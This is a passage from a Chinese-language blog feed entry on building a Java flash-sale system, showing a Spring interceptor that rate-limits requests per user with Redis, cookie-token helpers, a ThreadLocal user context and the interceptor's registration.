(HandlerMethod)handler;<br>AccessLimit accessLimit = hm.getMethodAnnotation(AccessLimit.class);<br><span class="hljs-keyword">if</span>(accessLimit == <span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br><span class="hljs-keyword">int</span> seconds = accessLimit.seconds();<br><span class="hljs-keyword">int</span> maxCount = accessLimit.maxCount();<br><span class="hljs-keyword">boolean</span> needLogin = accessLimit.needLogin();<br>String key = request.getRequestURI();<br><span class="hljs-keyword">if</span>(needLogin) &#123;<br><span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span>) &#123;<br>render(response, CodeMsg.SESSION_ERROR);<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br>key += <span class="hljs-string">&quot;_&quot;</span> + user.getId();<br>&#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//do nothing</span><br>&#125;<br>AccessKey ak = AccessKey.withExpire(seconds);<br>Integer count = redisService.get(ak, key, Integer.class);<br>    <span class="hljs-keyword">if</span>(count  == <span class="hljs-keyword">null</span>) &#123;<br>     redisService.set(ak, key, <span class="hljs-number">1</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(count &lt; maxCount) &#123;<br>     redisService.incr(ak, key);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>    render(response, CodeMsg.ACCESS_LIMIT_REACHED);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br><br>    <span class="hljs-comment">//限流提醒</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">render</span><span class="hljs-params">(HttpServletResponse response, CodeMsg cm)</span><span class="hljs-keyword">throws</span> Exception </span>&#123;<br>response.setContentType(<span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>);<br>OutputStream out = response.getOutputStream();<br>String str  = JSON.toJSONString(Result.error(cm));<br>out.write(str.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>out.flush();<br>out.close();<br>&#125;<br><br>    <span class="hljs-comment">//getUser()和getCookieValue()从之前的拦截器拷贝得来</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> MiaoshaUser <span class="hljs-title">getUser</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;<br>String paramToken = request.getParameter(MiaoshaUserService.COOKIE_NAME_TOKEN);<br>String cookieToken = getCookieValue(request, MiaoshaUserService.COOKIE_NAME_TOKEN);<br><span class="hljs-keyword">if</span>(StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br>String token = StringUtils.isEmpty(paramToken)?cookieToken:paramToken;<br><span class="hljs-keyword">return</span> userService.getByToken(response, token);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">getCookieValue</span><span class="hljs-params">(HttpServletRequest request, String cookiName)</span> </span>&#123;<br>Cookie[]  cookies = request.getCookies();<br><span class="hljs-keyword">if</span>(cookies == <span class="hljs-keyword">null</span> || cookies.length &lt;= <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(Cookie cookie : cookies) &#123;<br><span class="hljs-keyword">if</span>(cookie.getName().equals(cookiName)) &#123;<br><span class="hljs-keyword">return</span> cookie.getValue();<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>拦截器中使用了之前的拦截器UserArgumentResolver中的getUser()和getCookieValue()方法。但是这样就会有重复的代码，所以再次优化：</p><p>上面获取到MiaoshaUser对象之后，再设置到一个ThreadLocal 本地变量中（多线程）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserContext</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;MiaoshaUser&gt; userHolder = <span class="hljs-keyword">new</span> ThreadLocal&lt;MiaoshaUser&gt;();<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUser</span><span class="hljs-params">(MiaoshaUser user)</span></span>&#123;<br>        userHolder.set(user);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MiaoshaUser <span class="hljs-title">getUser</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> userHolder.get();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之前的UserArgumentResolver 则直接调用UserContext.getUser即可</p><ol><li>注册拦截器</li></ol><p>在WebConfig中注册拦截器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;<br>registry.addInterceptor(accessInterceptor);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">记录Java秒杀系统的设计与实现</summary>
    
    
    
    <category term="项目" scheme="http://example.com/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="项目" scheme="http://example.com/tags/%E9%A1%B9%E7%9B%AE/"/>
    
    <category term="秒杀" scheme="http://example.com/tags/%E7%A7%92%E6%9D%80/"/>
    
  </entry>
  
</feed>
